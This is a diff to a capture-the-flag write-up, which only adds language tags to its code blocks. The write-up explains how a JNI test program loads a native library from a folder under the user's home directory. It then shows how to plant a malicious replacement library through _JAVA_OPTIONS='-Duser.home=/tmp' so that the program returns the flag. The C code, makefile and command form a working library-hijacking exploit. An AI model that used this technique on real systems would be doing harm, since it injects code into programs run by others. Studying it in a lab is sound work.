@@ -4,7 +4,7 @@
 
 ``hellotest`` is written in C++, it invokes java function ``sayHello`` via JNI. The function is defined in ``Helloworld.java``, it invokes a native function ``print``.
 
-```
+```java
     ...
     public static void sayHello(String flag) throws Exception
     {
@@ -24,7 +24,7 @@
 
 ``print`` is a C function, defined in ``hellolib.c``, which will be used to build shared object ``hellolib.so`` to be loaded into JVM at runtime.
 
-```
+```c
 JNIEXPORT void JNICALL Java_Helloworld_print
   (JNIEnv* env, jclass cls, jstring msg)
 {
@@ -38,7 +38,7 @@ JNIEXPORT void JNICALL Java_Helloworld_print
 
 ``HelloWorld`` copy ``hellolib.so`` from ``HelloWorld.jar``, here comes the vulnerability, it then copy ``hellolib.so`` to directory ``libFolder`` for later invoke. ``libFolder`` is a directoy, named *".helloWorld"*, under *System.getProperty("user.home")*. If we specify the property *"user.home"*, we can make it use library in arbitrary path.
 
-```
+```java
     private static void loadingLibrary() throws Exception
     {
         Path libFolder = Paths.get(System.getProperty("user.home"), ".helloWorld");
@@ -69,7 +69,7 @@ JNIEXPORT void JNICALL Java_Helloworld_print
 
 We need to create a our evil ``hellolib.c``, lets' say ``fakelib.c``.  In the file we create a char array contains string *"flag"*.
 
-```
+```c
     jcharArray buf = (*env)->NewCharArray(env, 4);
     jchar arr[4] = {'f','l','a','g'};
     (*env)->SetCharArrayRegion(env, buf, 0, 4, arr); 
@@ -77,7 +77,7 @@ We need to create a our evil ``hellolib.c``, lets' say ``fakelib.c``.  In the fi
 
 Assign the char array ``buf`` to ``msg``, *"\[C"* to indicate we are getting *value* field which is a char array as specified in [JNI Types and Data Structures](https://docs.oracle.com/javase/7/docs/technotes/guides/jni/spec/types.html#wp276)
 
-```
+```c
     jclass cla = (*env)->GetObjectClass(env, msg);
     jfieldID id = (*env)->GetFieldID(env, cla, "value", "[C");
     (*env)->SetObjectField(env, msg, id, buf);
@@ -85,7 +85,7 @@ Assign the char array ``buf`` to ``msg``, *"\[C"* to indicate we are getting *va
 
 We need a customized makefile to build the *.so* file, since we are only allowed to create files in */tmp*, we need to change the paths accordingly.
 
-```
+```make
 libhello.so : fakelib.o
     cc fakelib.o -shared -o libhello.so
     mkdir -p .helloWorld
@@ -98,7 +98,7 @@ fakelib.o :
 
 *_JAVA_OPTIONS* is way to specify JVM arguments as an environment variable instead of command line parameters. Run ``hellotest`` in ``/home/lib`` directory with *_JAVA_OPTIONS="-Duser.home=/tmp"*.
 
-```
+```bash
 $ _JAVA_OPTIONS="-Duser.home=/tmp" /home/lib/hellotest
 Picked up _JAVA_OPTIONS: -Duser.home=/tmp
 fakelib                                                                                                                                                                 
